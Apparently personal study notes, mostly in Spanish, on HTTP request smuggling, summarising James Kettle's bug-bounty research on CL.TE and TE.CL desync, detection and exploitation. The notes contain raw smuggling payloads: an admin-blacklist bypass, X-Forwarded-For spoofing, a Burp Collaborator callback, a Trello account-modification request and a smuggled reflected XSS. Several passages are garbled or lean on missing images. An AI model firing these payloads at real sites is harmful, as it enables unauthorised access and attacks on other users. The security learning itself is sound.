### Elementos de la conexion a una web
- Load Balancer proxy es el servidor por el que nos conectamos y desde donde viene nuestras solicitudes http
- Backend Internal Server recibe las solicitudes del proxy
- Sockets son un flujo de datos con el que los servidores se conectan a una red.

### Analogía sobre que consiste el http smuggling
Envíamos una solicitud HTTP y el backend la responde, como si fuera una cadena de ensamble en que cada solicitud se le da un respuesta pre-programada. Supongamos que están diferenciadas por "líneas negras" y el load balancer identifica estas líneas como solicitudes http distintas, diferencia una solicitud y la envía como una aparte al backend. El backend en cambio identifica las "líneas negras" y "las líneas natajad" que representamos como las solicitudes venenos, inyectadas por el smuggling, por lo que el load balancer vio como una request el backend server vio 2 request. el load balancer retorna una respuesta y la otra respuesta queda pendiente en la siguiente solicitud, por eso en los laboratorios tenemos, dentro del repeater de burpsuite, una pestaña con el ataque del http smuggling y otra pestaña al mismo endpoint con la solicitur normal.

En la cabezera http tenemos 2 atributos para contar el tamaño del body, los cuales son diferenciados uno del otro y al utilizar ambos la solicitud puede desincronizar y generar una ambiguedad. Primero vamos a ver Content-Length que cuenta los bytes, cada espacio (tecla enter) son dos bytes no visibles, pero se representan como `\r\n` , conocidos como CLRF,  (Carriage Return Line Feed hace referencia a las antiguas máquinas de escibir, donde tenías un "carro" que iba a un extremo, cuando terminabas con el renglon retornaba al inicio, luego el brazo que imprimía lo carácteres, el "Line Feed").

Este es un ejemplo clásico de http smugling el cual no funciona en el mundo real del bug bounty
![[Pasted image 20240804193326.png]]
Al primer CL lo lee el frontend, pero por el segundo CL el backend lo lee como la continuación del siguiente método, sería un POST que termina en el 5 y la siguiente petición es el sexto byte

En realidad lo interesante sería usar el método Transfer Encoding (TE). 
Este metodo consiste en que en cada renglón hay un número que indica cuanto carácteres imprimibles hay (osea que no cuenta los CRLF) y lo sigue el renglón, y así sucesivamente
![[Pasted image 20240804193210.png]]
--  

Este es un ejemplo básico donde el frontend interpreta primero Content-Lenght, por lo que la interpretación del front sería:
```HTP
0\r\n
\r\n
G
```
![[Pasted image 20240804195336.png]]

En la especificación original (RFC 2616) es el HTTP protocol especifica que siempre que estén mezclados estas dos formas, básicamente, se priorizarán el Transfer-Encoding, osea que perce no sé niegan, sino que de por sí pueden funcionar ambas
![[Pasted image 20240804200306.png]]
El RFC 7230, que actualiza y reemplaza partes del RFC 2616, también refuerza esta regla.
Si el servidor no soporta `Transfer-Encoding`, debería rechazar la solicitud con un código de estado 400 (Bad Request) o un 501 (Not Implemented).
Si el proxy maneja `Transfer-Encoding` y el servidor back-end solo `Content-Length`, esto crea un escenario de ataque CL.TE, donde la desincronización entre el proxy y el servidor permite que una solicitud maliciosa pase inadvertida. Ejemplo de esto son los websites con el CDN (Content Delivery Network) de akamai, sanetizados en 2021

Aún cuando soportan TE es posible ejecutar este ataque mediante un ofuscamiento, como los siguientes ejemplos
![[Pasted image 20240804205824.png]]
Pero para no perder tiempo probando los muchos métodos posibles de ofuscación, James Kettle recomienda la siguiente metodología:
![[Pasted image 20240804205954.png]]


## Detectar
![[Pasted image 20240804210638.png]]
Si es CL.CL responderá un 200 ok
si es TE.TE o TE.CL sería un "bad request" 400
si es un CL.TE sería un "read timeout" 503

Por otro lado tenemos la otra petición
![[Pasted image 20240804211153.png]]
si es CL.CL o TE.TE sería un "bad request" 400
si es un TE.CL sería un "read timeout" 503
si es CL.TE se enveneraría el socket dando un GPOST

Es importante aclarar que hay que utilizar está técnica en cada endpoint de la aplicación web

## Confirmación
La forma de confirmar si es vulnerable, si responde con un 404. Es importante no enviar ambas solicitudes en una misma conexión http porque puede resultar en falsos positivos
![[Pasted image 20240804211836.png]]

## Exploración

### Blacklist example
Un ejemplo de exploración, esta página bloqueaba el acceso de `/admin`
![[Pasted image 20240804220218.png]]
```HTTP
POST / HTTP/1.1
Host: software-vendor.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: software-vendor.com
X:X
```

De esta manera el frontend pensaba que era una petición a la raíz![[Pasted image 20240804220820.png]]
```HTTP
POST / HTTP/1.1
Host: software-vendor.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: software-vendor.com
X: XGET / HTTP/1.1
	Host: software-vendor.com
```
Así que agregando una petición sirvio

### X-Forwarded-For
Muchas páginas usan la cabecera X-Forwarded-For, que identifica la dirección IP del cliente que se conectal al sitio web. Cualquier página decente bloquearia el tratar de redefinir esta cabecera. Con un quest Request Smuggling podrías bypasear la seguria del frontend, y de está manera reescribir tu dirección IP
![[Pasted image 20240805120526.png]]
```HTTP
POST / HTTP/1.1
Host: software-vendor.com
X-Forwarded-For: 127.0.0.1
Content-Length: 200
Transfer-Encoding : chunked

0

GET /admin HTTP/1.1
Host: software-vendor.com
X-Forwarded-For: 127.0.0.1
X: XGET / HTTP/1.1
	Host: software-vendor.com
```

Este es un ejemplo que james, por el cual le pagaron 300 $, aclara que no es particularmente muy bien remunerada como otras vulnerabilidades más critícas, pero dijo que funciona en todos los servidores en 2019, cuando está vulnerabilidad era casi desconocida (igual sigue sin ser muy famosa).

### Blind Request Smuggling
Imaginenomos  que tenemos una web donde el time out sirvió, pero el volumen del tráfico es muy alto, (Website traffic volume refers to **the total number of visitors a website receives within a specific period**). Usando un nombre uno en el X-Forwarded-For
![[Pasted image 20240805143306.png]]
```HTTP
POST / HTTP/1.1
Host: software-vendor.com
X-Forwarded-For: 127.0.0.1
Content-Length: 200
Transfer-Encoding : chunked

0

GET /admin HTTP/1.1
Host: software-vendor.com
X-Forwarded-For: xyz.burpcollaborator.net
X: XGET...
```

### Login Bug
EN este ejemplo dentro de la propia contraseña del proxy pudo concatenar la request
![[Pasted image 20240805151029.png]]


### Reverse Proxy
En este ejemplo vemos a New Relic que no estaba usando un backend en sí sino un reverse proxy.
Cambieando el host header podía acceder a distintos sitemas, un SSOF.
El servidor respondía con un https porque considera que la solicitud es http y la intenta upgradear, para evistar esto tenemos la cabecera `X-Forwarded-Proto: https`. James fue añadiendo distintas cabeceras 
![[Pasted image 20240805154401.png]]
Instead of continue proving all that stuff, James appeal to his last notes from later bounties of the same web site.

## TAKEAWAY
Si el servidor web está configurado para usar HTTPS, detecta la solicitud HTTP y responde con un código de estado 301 (Moved Permanently) o 302 (Found) para indicar que el recurso solicitado ha sido movido permanentemente o temporalmente a una ubicación diferente.
### Trello exploit
"If a web a application has any way of persistently storing text data, then exploitation is really easy"
![[Pasted image 20240805190758.png]]

```HTTP
POST /1/cards HTTP/1.1
Host: trello.com
Transfer-Encoding:[tab]chunked
Content-Length: 4

9f
PUT /1/members/1234 HTTP/1.1
Host: trello.com
Content-Type: application/x-www-form-urlencoded
Content-Length:400

x=x&csrf=1234&username=testzzz&bio=cake
0

GET / HTTP/1.1
Host: trello.com
```



First James used this request to upgrade his account, using the borrow parameter at last. What did this bug more critical is that by concatenating that green request you just can get the information of any random user currently browsing in the web application. Also were able to file a support ticket which contained the user's requests with their emails and all of that
### Harmful Responses
In this example James have founded an reflected XSS 
```HTTP
POST /1/cards HTTP/1.1
Host: saas-app.com
Content-Length: 4
Transfer-Encoding : chunked

10
=x&csrf=token&x=
66
POST /index.php HTTP/1.1
Host: saas-app.com
COntent-Length: 100

SAML=a><script>alert(1)</script>
0 POST / HTTP/1.1
Host: saas-app.com
Cokie: ...
```

![[Pasted image 20240805200425.png]]
Which successfully could escalated to a bug more critical by smuggling another request that trigger the last request
```HTTP
POST /1/cards HTTP/1.1
Host: trello.com
Transfer-Encoding:[tab]chunked
Content-Length: 4

10
=x&csrf=token&x=
66
POST /index.php HTTP/1.1
Host: saas-app.com
COntent-Length: 100

SAML=a><script>alert(1)</script>
0POST / HTTP/1.1
Host: saas-app.com
Cookie:
```
so any random client who access the web would be affected, so it's a critical level

sometimes getting a 421 error is because one of the headers is unexpected